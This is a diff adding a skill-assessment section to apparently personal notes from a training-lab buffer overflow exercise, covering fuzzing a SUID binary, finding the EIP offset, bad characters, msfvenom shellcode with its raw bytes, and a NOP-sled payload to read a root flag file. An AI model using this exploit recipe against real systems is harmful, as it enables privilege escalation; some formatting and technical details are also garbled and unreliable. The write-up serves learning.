@@ -94,4 +94,86 @@ After finding all bad characters that can infect the shellcode , just generate t
 # Identification of the Return Address
 Now with `EIP`, we have to change the 0x66666666 into the address inside NOPS area, so that each cycle, its goes up (since the EIP autopilot increase value) until meet our shellcode. Without `DEP`, we `EIP` will execute the shellcode we inject. Just reminder, use little endian, so the address in gdb have to be modified a lil bit.
 
+# Skill assessment
+## Time to cook the test:
+- The `leave_msg` is exec file that take argument and stored it to `msg.txt`
+- The `msg.txt` is owned by root, and set `SUID` .
+- Object is to get `/root/flag.txt`.
+## Planning:
+So we cant directly modify the `msg.txt` but using `leave_msg`.The `SUID` is set for `msg.txt` so if we somehow inject code to change it into executable file and run `cat /root/flag.txt` command, we __BALL__. 
+## Execute:
+- Try reaching the `EIP` with 2000 `\x55` into argument, still run normally. Buffer gonna be big.
+```(gdb) run $(python -c "print '\x55'*2000 ")
+Starting program: /home/htb-student/leave_msg $(python -c "print '\x55'*2000 ")
+Message left for the administrator.
+```
+- How about 3000 :
+```(gdb) run $(python -c "print '\x55'*3000 ")
+Starting program: /home/htb-student/leave_msg $(python -c "print '\x55'*3000 ")
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+```
+- Time to find EIP with `msf-tools`:
+I created pattern with `pattern_create` with 3000 bytes and get `0x37714336` in `EIP`.Used `pattern_offset` I we have to 2060 (+4) bytes to reach the EIP.
+- The section ask for stack size when we overwrite `EIP`. I have to ask chatbot and we can use `info proc mapping` to check size of stack, heap or both start and end address of them.And my answer is 0x20000 
+- Now we fight the big one. Find the flag.We clear the `msg.txt` first by execute the `leave_msg` with non argument so that we can write the exec code to `msg.txt` and run it to find flag.
+- I plan to exec normally `leave_msg` with the argument ```cat /root/flag.txt``` ,buffer overflow the `leave_msg` to execute `msg.txt`.
+- I need to find all the bad character to generate the shellcode. The CHARS is 256 bytes.\n
+Buffer = 2060-256 = 1804*"'\x55'".\n
+EIP = 4*"'\x66'" 
+- set breakpoint at `leave_msg`, let examine the memory by ``x/2000xb $esp+500 `` 
+```0xffffd5e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5f0:     0x55    0x55    0x55    0x55    0x01    0x02    0x03    0x04
+0xffffd5f8:     0x05    0x06    0x07    0x08    0x00    0x0b    0x0c    0x0d
+
+```
+Of courses, classic '\x00' will be removed.
+```
+0xffffd5e0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5f0:     0x55    0x55    0x55    0x55    0x01    0x02    0x03    0x04
+0xffffd5f8:     0x05    0x06    0x07    0x08    0x00    0x0b    0x0c    0x0d
+```
+Now instead 0x09 we got 0x00. So '\x09' .
+```
+```
+```0xffffd5e8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5f0:     0x55    0x55    0x55    0x55    0x01    0x02    0x03    0x04
+0xffffd5f8:     0x05    0x06    0x07    0x08    0x00    0x0b    0x0c    0x0d
+``
+``
+```
+0x0a is replaced by 0x00. So '\x0a'. Then 0x20 replaced by 0x00. 
+- All bad chars are :"\x00\x09\x0a\x20"
+- We generate payload by `msfvenom`:
+```
+```
+`msfvenom -p linux/x86/exec CMD="/bin/cat</root/flag.txt" --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\20" --out shellcode`
+- Shellcode: 
+``unsigned char buf[] = 
+"\xbf\x81\x42\x4c\xc7\xda\xc6\xd9\x74\x24\xf4\x58\x31\xc9"
+"\xb1\x0f\x83\xc0\x04\x31\x78\x11\x03\x78\x11\xe2\x74\x28"
+"\x47\x9f\xef\xff\x31\x77\x22\x63\x37\x60\x54\x4c\x34\x07"
+"\xa4\xfa\x95\xb5\xcd\x94\x60\xda\x5f\x81\x6b\x1d\x5f\x51"
+"\xa3\x7f\x36\x3f\x94\x1c\xa9\xcb\xd6\xcd\x5b\x5b\x48\x66"
+"\xb4\xc5\xfa\xe7\xad\x27\x77\x90\x45\x38\x20\x33\x2c\xd9"
+"\x03\x33";
+``
+With size of 86 bytes.\nLet's take 1000 bytes as `NOPS` 
+So 2060 - 1000 - 86 = 974 bytes junk ( lets make it '0x55')
+NOPS = 1000 *'\x90' 
+And 4*'\x66' as place holder for return address( gonna point to NOPS)
+Examine the memory ,I take 1 of address in NOP area:'0xffffd2e0'
+So by little endian, It will be '0xe0d2ffff'
+```process 2209 is executing new program: /bin/dash
+/bin/cat: /root/flag.txt: Permission denied
+
+```
+Well we got gatekeeped. But why ??? 
+Asked Grok. It mentioned the `EUID`. 
+- When I execute `leave_msg` ,its `EUID` still 0 (root) since it has `SUID` set. But when I call `/bin/cat` , It create new process that `RealUID` as its `EUID`.So that I cant touch the file.
+Instead of executing cat command, we just generate directly reading file from msfvenom.
+
+
 
